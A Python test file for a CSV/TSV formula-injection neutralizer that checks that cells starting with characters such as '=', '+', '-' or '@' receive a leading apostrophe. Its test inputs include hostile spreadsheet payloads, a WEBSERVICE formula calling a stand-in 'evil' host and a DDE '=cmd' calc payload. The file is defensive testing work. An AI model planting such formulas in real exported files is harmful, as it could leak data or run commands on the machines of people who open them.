"""CSV/TSV spreadsheet formula-injection neutralization."""

from __future__ import annotations

import csv
import io

from clownpeanuts.core.csv_safe import SafeDictWriter, neutralize_cell, safe_row


def test_neutralize_cell_prefixes_formula_triggers() -> None:
    for trigger in ("=", "+", "-", "@", "\t", "\r"):
        assert neutralize_cell(f"{trigger}cmd").startswith("'")
    assert neutralize_cell("=WEBSERVICE(\"http://evil/\")") == "'=WEBSERVICE(\"http://evil/\")"


def test_neutralize_cell_leaves_safe_values_untouched() -> None:
    assert neutralize_cell("203.0.113.5") == "203.0.113.5"
    assert neutralize_cell("session-abc") == "session-abc"
    assert neutralize_cell("") == ""
    # Non-strings pass through unchanged.
    assert neutralize_cell(7) == 7
    assert neutralize_cell(1.5) == 1.5


def test_safe_row_only_touches_string_cells() -> None:
    row = safe_row({"ip": "=1+2", "count": 5, "score": -3.0})
    assert row["ip"] == "'=1+2"
    assert row["count"] == 5
    assert row["score"] == -3.0  # numeric negative is not a string trigger


def test_safe_dict_writer_neutralizes_rows_but_not_header() -> None:
    out = io.StringIO()
    writer = SafeDictWriter(csv.DictWriter(out, fieldnames=["source_ip", "session_id"]))
    writer.writeheader()
    writer.writerow({"source_ip": "=cmd|' /C calc'!A1", "session_id": "-evil"})
    text = out.getvalue()
    lines = text.splitlines()
    assert lines[0] == "source_ip,session_id"  # header untouched
    # Both attacker cells are neutralized with a leading apostrophe.
    assert lines[1].startswith("'=cmd") or lines[1].startswith('"\'=cmd')
    assert "'-evil" in text
